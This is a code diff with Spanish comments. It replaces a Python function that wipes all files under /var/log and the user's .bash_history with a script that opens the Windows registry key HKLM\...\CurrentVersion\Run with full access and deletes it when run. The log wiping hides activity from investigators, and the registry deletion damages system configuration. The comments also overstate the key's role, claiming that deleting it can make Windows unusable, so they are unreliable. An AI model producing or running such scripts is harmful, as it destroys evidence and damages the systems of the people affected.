@@ -1,46 +1,37 @@
-# ¡ADVERTENCIA DE CÓDIGO EXTREMO!
-# Esto es solo un esquema lógico para demostrar la posibilidad.
+import winreg
+# Importamos el módulo para acceder al Registro de Windows.
 
-import os
-import glob
+# Definimos la ubicación del 'Registro' a borrar
+# HKEY_LOCAL_MACHINE es una de las raíces principales.
+ROOT_KEY = winreg.HKEY_LOCAL_MACHINE 
 
-def eliminar_registros_extremos():
-    # Rutas típicas de logs en sistemas basados en Unix
-    rutas_criticas = [
-        '/var/log/',
-        '~/.bash_history',  # Historial de comandos del usuario
-        # Más rutas específicas podrían añadirse aquí
-    ]
+# CLAVE_A_BORRAR_CRITICA
+# Por ejemplo, una clave donde Windows guarda configuraciones
+# VITALES para su funcionamiento.
+CLAVE_A_BORRAR_CRITICA = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run" 
+
+# Nota: ELIMINAR CUALQUIER CLAVE DE ESTE NIVEL PUEDE INUTILIZAR
+# EL SISTEMA OPERATIVO Y REQUERIR REINSTALACIÓN COMPLETA.
+
+try:
+    # Se abre la clave con permisos de ELIMINACIÓN
+    clave_a_eliminar = winreg.OpenKey(
+        ROOT_KEY, 
+        CLAVE_A_BORRAR_CRITICA, 
+        0, 
+        winreg.KEY_ALL_ACCESS
+    )
     
-    contador = 0
-    print("Iniciando la secuencia de eliminación crítica...")
-    
-    for ruta_base in rutas_criticas:
-        try:
-            # Si es un directorio, busca todos los archivos dentro
-            if os.path.isdir(ruta_base):
-                # Usamos glob para encontrar todos los archivos de log
-                archivos_a_eliminar = glob.glob(os.path.join(ruta_base, '*'))
-                
-                for archivo in archivos_a_eliminar:
-                    if os.path.isfile(archivo):
-                        os.remove(archivo)
-                        print(f"[{contador}] Eliminado: {archivo}")
-                        contador += 1
-            # Si es un archivo (como .bash_history), lo elimina directamente
-            elif os.path.isfile(ruta_base):
-                os.remove(ruta_base)
-                print(f"[{contador}] Eliminado: {ruta_base}")
-                contador += 1
-                
-        except PermissionError:
-            print(f"--- Falla de Permiso: Necesitas ser root/sudo para {ruta_base}")
-        except FileNotFoundError:
-            print(f"--- Advertencia: Ruta no encontrada: {ruta_base}")
-        except Exception as e:
-            print(f"--- Error inesperado al procesar {ruta_base}: {e}")
+    # Se elimina la clave
+    winreg.DeleteKey(clave_a_eliminar, "") # Se usa una cadena vacía para borrar la clave que acabamos de abrir
+    print(f"La clave de registro {CLAVE_A_BORRAR_CRITICA} ha sido borrada.")
 
-    print(f"\n¡**Operación de Limpieza Finalizada**! Total de archivos eliminados: {contador}")
+except FileNotFoundError:
+    print("La clave especificada ya no existe, o no se encontró.")
+except PermissionError:
+    # Necesitas elevar el proceso a administrador para que funcione.
+    print("Permiso denegado. Necesitas ejecutar el script como Administrador.")
+except Exception as e:
+    print(f"Ocurrió un error catastrófico: {e}")
 
-# Si ejecutas esta función, ¡prepara el backup!
-# eliminar_registros_extremos()
+# winreg.CloseKey(clave_a_eliminar) # winreg.OpenKey devuelve un objeto de contexto que se cierra automáticamente, pero es buena práctica.
